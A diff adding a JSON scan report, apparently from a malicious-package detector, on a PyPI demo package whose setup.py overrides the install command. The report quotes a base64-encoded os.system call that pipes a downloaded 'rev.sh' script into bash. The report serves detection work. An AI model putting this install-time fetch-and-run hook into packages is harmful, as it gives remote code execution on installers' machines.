@@ -1,0 +1,30 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "exec-base64": {},
+        "clipboard-access": {},
+        "obfuscation": {},
+        "silent-process-execution": {},
+        "steganography": {},
+        "dll-hijacking": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:27",
+                "code": "setuptools.setup(\n    name = \"pycryptexe\",\n    version = \"1.1.4\",\n    author = \"JungleBrothers\",\n    author_email = \"junglebrothers@gmail.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description =...\n    },\n)\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "exfiltrate-sensitive-data": {},
+        "code-execution": [
+            {
+                "location": "setup.py:16",
+                "code": "    os.system(b64d(\"Y3VybCAtcyBodHRwOi8vbG9jYWxob3N0L3Jldi5zaCB8IGJhc2gK\"))\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "download-executable": {},
+        "shady-links": {}
+    },
+    "path": "./dataset/pypi/pycryptexe-1.1.4"
+}
